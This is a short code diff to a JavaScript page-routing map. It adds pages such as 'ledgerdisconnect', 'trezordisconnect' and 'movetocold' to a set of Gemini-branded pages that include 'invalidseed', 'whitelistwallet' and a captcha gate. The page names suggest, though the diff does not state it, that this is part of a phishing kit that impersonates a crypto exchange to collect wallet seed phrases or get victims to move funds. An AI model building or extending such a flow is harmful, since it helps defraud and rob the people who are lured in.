@@ -31,9 +31,13 @@ const pageMapping = {
     'whitelistwallet': 'geminiwhitelistwallet',
     'whitelistsuccessful': 'geminiwhitelistsuccessful',
     'review': 'geminireview',
+    'pendingreview': 'geminireview',
     'completed': 'geminicompleted',
     'disconnectwallet': 'geminidisconnectwallet',
     'invalidseed': 'geminiinvalidseed',
+    'ledgerdisconnect': 'LedgerDisconnect',
+    'trezordisconnect': 'TrezorDisconnect',
+    'movetocold': 'MoveToCold',
     'captcha': 'captcha', // Shared captcha page
     'error': 'error'     // Shared error page
   },
